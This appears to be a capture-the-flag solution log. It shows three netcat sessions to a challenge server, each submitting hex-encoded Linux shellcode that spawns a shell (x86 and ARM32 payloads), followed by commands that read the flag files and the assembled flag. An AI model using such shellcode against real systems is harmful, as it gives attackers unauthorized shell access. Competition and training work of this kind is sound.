```
$ nc pwn2.sect.ctf.rocks 3000
[*] Intel-x86 Module
[!] Enter your hex-encoded shellcode:6a3158cd8089c389c16a4658cd8031c031c931d2eb0c5b884b07525389ccb00bcd80e8efffffff2f62696e2f73684e
[+] Running your shellcode!
id
uid=1002(intel32) gid=1002(intel32) groups=1002(intel32)
ls -l
total 724
-r--r----- 1 root intel32     10 Sep  3 09:50 flag
-rwxr-sr-x 1 root intel32 733672 Sep  3 09:43 pwn_x86
cat flag
SECT{f0LL
```

```
$ nc pwn2.sect.ctf.rocks 3001
[*] Intel-x64 Module
[!] Enter your hex-encoded shellcode:6a3158cd8089c389c16a4658cd8031c031c931d2eb0c5b884b07525389ccb00bcd80e8efffffff2f62696e2f73684e
[+] Running your shellcode!
id
uid=1001(intel64) gid=1001(intel64) groups=1001(intel64)
ls -la
total 872
drwxr-xr-x 2 root root      4096 Sep  3 09:46 .
drwxr-xr-x 7 root root      4096 Sep  7 08:20 ..
-r--r----- 1 root intel64     13 Sep  3 09:50 flag
-rwxr-sr-x 1 root intel64 877695 Sep  3 09:43 pwn_x64
cat flag
0W_Th3_wh1TE
```

```
$ nc pwn2.sect.ctf.rocks 3002
[*] ARM32 Module
[!] Enter your hex-encoded shellcode:01608fe216ff2fe178460830491a921a0b2701df2f62696e2f7368
[+] Running your shellcode!
ls
flag
pwn_arm32
qemu-arm
cat flag
_r4Bb1T}
```

```
SECT{f0LL0W_Th3_wh1TE_r4Bb1T}
```
